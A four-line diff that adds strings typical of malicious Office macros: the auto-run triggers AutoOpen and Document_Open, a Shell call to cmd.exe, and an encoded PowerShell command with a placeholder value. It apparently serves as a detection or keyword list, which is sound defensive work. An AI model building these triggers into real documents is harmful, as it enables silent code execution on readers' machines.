@@ -1,0 +1,4 @@
+AutoOpen
+Document_Open
+Shell("cmd.exe")
+powershell -enc AAAA
